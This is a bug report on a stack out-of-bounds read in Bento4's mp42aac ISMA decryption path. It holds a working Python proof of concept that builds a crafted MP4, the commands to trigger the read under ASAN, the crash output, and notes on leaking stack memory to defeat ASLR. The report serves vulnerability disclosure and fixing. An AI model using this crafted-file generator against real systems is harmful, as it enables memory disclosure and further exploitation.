## Bug0: Stack Buffer Overflow OOB Read in AP4_IsmaCipher::DecryptSampleData via Crafted iSFM iv_length

In `AP4_IsmaCipher::DecryptSampleData()` in `Ap4IsmaCryp.cpp`, the 16-byte stack array `zero_enc[16]` is accessed at index `offset + i` where `offset` and `chunk` both equal `bso % 16` (up to 15), making the maximum index `2 * offset - 1` which reaches 17 when offset is 9, reading up to 14 bytes beyond the array boundary and leaking adjacent stack memory into decrypted output.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
Stack OOB Read in AP4_IsmaCipher::DecryptSampleData via Crafted iSFM iv_length
CWE-125 (Out-of-bounds Read)
"""

import struct
import os

OUTPUT_FILE = "poc_input.mp4"

MATRIX = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)


def make_box(fourcc, payload=b''):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + fourcc + payload


def make_fullbox(fourcc, version, flags, payload=b''):
    vh = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return make_box(fourcc, vh + payload)


def build_ftyp():
    payload = b'isom'
    payload += struct.pack('>I', 0x200)
    payload += b'isom' + b'iso2' + b'mp41'
    return make_box('ftyp', payload)


def build_isfm():
    payload = struct.pack('>BBB',
        0x00,  # selective_encryption = 0
        0x00,  # key_indicator_length = 0
        0x01   # iv_length = 1 (KEY FIELD: triggers m_IvLength=1 path)
    )
    return make_fullbox('iSFM', 0, 0, payload)


def build_schi():
    return make_box('schi', build_isfm())


def build_frma():
    return make_box('frma', b'mp4a')


def build_schm():
    payload = b'iAEC' + struct.pack('>I', 1)
    return make_fullbox('schm', 0, 0, payload)


def build_sinf():
    return make_box('sinf', build_frma() + build_schm() + build_schi())


def build_enca():
    se_fields = b'\x00' * 6 + struct.pack('>H', 1)
    au_fields = (
        struct.pack('>H', 0) +
        struct.pack('>H', 0) +
        struct.pack('>I', 0) +
        struct.pack('>H', 2) +
        struct.pack('>H', 16) +
        struct.pack('>H', 0) +
        struct.pack('>H', 0) +
        struct.pack('>I', 44100 << 16)
    )
    return make_box('enca', se_fields + au_fields + build_sinf())


def build_stsd():
    payload = struct.pack('>I', 1) + build_enca()
    return make_fullbox('stsd', 0, 0, payload)


def build_stts():
    payload = struct.pack('>I', 1)
    payload += struct.pack('>II', 1, 1024)
    return make_fullbox('stts', 0, 0, payload)


def build_stsc():
    payload = struct.pack('>I', 1)
    payload += struct.pack('>III', 1, 1, 1)
    return make_fullbox('stsc', 0, 0, payload)


def build_stsz(sample_size):
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 1)
    payload += struct.pack('>I', sample_size)
    return make_fullbox('stsz', 0, 0, payload)


def build_stco(chunk_offset):
    payload = struct.pack('>I', 1)
    payload += struct.pack('>I', chunk_offset)
    return make_fullbox('stco', 0, 0, payload)


def build_stbl(sample_size, chunk_offset):
    children = (
        build_stsd() +
        build_stts() +
        build_stsc() +
        build_stsz(sample_size) +
        build_stco(chunk_offset)
    )
    return make_box('stbl', children)


def build_smhd():
    payload = struct.pack('>HH', 0, 0)
    return make_fullbox('smhd', 0, 0, payload)


def build_url():
    return make_fullbox('url ', 0, 0x000001, b'')


def build_dref():
    payload = struct.pack('>I', 1) + build_url()
    return make_fullbox('dref', 0, 0, payload)


def build_dinf():
    return make_box('dinf', build_dref())


def build_minf(sample_size, chunk_offset):
    children = (
        build_smhd() +
        build_dinf() +
        build_stbl(sample_size, chunk_offset)
    )
    return make_box('minf', children)


def build_mdhd():
    payload = (
        struct.pack('>I', 0) +
        struct.pack('>I', 0) +
        struct.pack('>I', 44100) +
        struct.pack('>I', 1024) +
        struct.pack('>H', 0) +
        struct.pack('>H', 0)
    )
    return make_fullbox('mdhd', 0, 0, payload)


def build_hdlr():
    payload = (
        struct.pack('>I', 0) +
        b'soun' +
        b'\x00' * 12 +
        b'\x00'
    )
    return make_fullbox('hdlr', 0, 0, payload)


def build_mdia(sample_size, chunk_offset):
    children = (
        build_mdhd() +
        build_hdlr() +
        build_minf(sample_size, chunk_offset)
    )
    return make_box('mdia', children)


def build_tkhd():
    payload = (
        struct.pack('>I', 0) +
        struct.pack('>I', 0) +
        struct.pack('>I', 1) +
        struct.pack('>I', 0) +
        struct.pack('>I', 1024) +
        b'\x00' * 8 +
        struct.pack('>H', 0) +
        struct.pack('>H', 0) +
        struct.pack('>H', 0x0100) +
        struct.pack('>H', 0) +
        MATRIX +
        struct.pack('>I', 0) +
        struct.pack('>I', 0)
    )
    return make_fullbox('tkhd', 0, 3, payload)


def build_trak(sample_size, chunk_offset):
    children = build_tkhd() + build_mdia(sample_size, chunk_offset)
    return make_box('trak', children)


def build_mvhd():
    payload = (
        struct.pack('>I', 0) +
        struct.pack('>I', 0) +
        struct.pack('>I', 44100) +
        struct.pack('>I', 1024) +
        struct.pack('>I', 0x00010000) +
        struct.pack('>H', 0x0100) +
        b'\x00' * 10 +
        MATRIX +
        b'\x00' * 24 +
        struct.pack('>I', 2)
    )
    return make_fullbox('mvhd', 0, 0, payload)


def build_moov(sample_size, chunk_offset):
    children = build_mvhd() + build_trak(sample_size, chunk_offset)
    return make_box('moov', children)


def build_mdat(data):
    return make_box('mdat', data)


def main():
    # IV byte 0x09 causes bso=9, bso%16=9, offset=9, chunk=9
    # Loop i=0..8: zero_enc[9+i], at i=8 -> zero_enc[17] -> OOB (array is [16])
    sample_data = b'\x09' + b'\xAA' * 19  # 1 byte IV + 19 bytes payload = 20 bytes

    placeholder_moov = build_moov(len(sample_data), 0)
    moov_size = len(placeholder_moov)

    ftyp_box = build_ftyp()
    ftyp_size = len(ftyp_box)

    chunk_offset = ftyp_size + moov_size + 8

    moov_box = build_moov(len(sample_data), chunk_offset)
    mdat_box = build_mdat(sample_data)

    mp4_data = ftyp_box + moov_box + mdat_box

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)

    print(f"[+] Generated: {OUTPUT_FILE} ({len(mp4_data)} bytes)")
    print(f"[+] IV byte=0x09 -> bso=9, offset=9 -> zero_enc[17] OOB read")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac --key 0123456789abcdef0123456789abcdef poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff80d372c0 at pc 0x556a8d46068e bp 0x7fff80d371b0 sp 0x7fff80d371a0
READ of size 1 at 0x7fff80d372c0 thread T0
    #0 0x556a8d46068d in AP4_IsmaCipher::DecryptSampleData(AP4_DataBuffer&, AP4_DataBuffer&, unsigned char const*) (mp42aac+0xb2768d)
    #1 0x556a8d16a2b7 in main (mp42aac+0x8312b7)

### Impact

An attacker who supplies a crafted MP4 file can cause `mp42aac` to read up to 14 bytes beyond the 16-byte `zero_enc` stack buffer in `AP4_IsmaCipher::DecryptSampleData`, mixing adjacent stack contents (including the `iv` array, `bso_bytes`, saved frame pointer, and potentially return addresses) into the decrypted audio output. This constitutes an out-of-bounds read that enables stack memory disclosure, which can be leveraged to defeat ASLR and provide an attacker with layout information needed to chain further exploitation primitives. The vulnerability is triggered by any invocation of `mp42aac` with the `--key` flag against an untrusted MP4 file, requiring no special privileges beyond passing a user-supplied file to the tool.
